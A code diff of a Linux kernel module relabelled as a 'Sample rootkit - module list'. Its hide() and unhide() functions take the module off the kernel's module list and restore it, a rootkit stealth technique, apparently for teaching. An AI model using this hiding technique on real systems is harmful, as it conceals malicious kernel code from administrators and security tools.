@@ -3,8 +3,8 @@
 #include <linux/kernel.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Robert W.Oliver II");
-MODULE_DESCRIPTION("A simple example Linux module.");
+MODULE_AUTHOR("Krzysztof Zdulski");
+MODULE_DESCRIPTION("Sample rootkit - module list");
 MODULE_VERSION("0.01");
 
 struct list_head *module_list;
@@ -12,9 +12,8 @@ int is_hidden = 0;
 
 void hide(void)
 {
-    if (is_hidden) {
+    if (is_hidden)
         return;
-    }
 
     module_list = THIS_MODULE->list.prev;
 
@@ -23,12 +22,10 @@ void hide(void)
     is_hidden = 1;
 }
 
-
 void unhide(void)
 {
-    if (!is_hidden) {
+    if (!is_hidden)
         return;
-    }
 
     list_add(&THIS_MODULE->list, module_list);
 
@@ -37,14 +34,14 @@ void unhide(void)
 
 static int __init lkm_example_init(void)
 {
-    printk(KERN_INFO "Hello, World !\n");
+    printk(KERN_INFO "loading module list module");
     hide();
     return 0;
 }
 
 static void __exit lkm_example_exit(void)
 {
-    printk(KERN_INFO "Goodbye, World !\n");
+    printk(KERN_INFO "unloading module list module");
     unhide();
 }
 
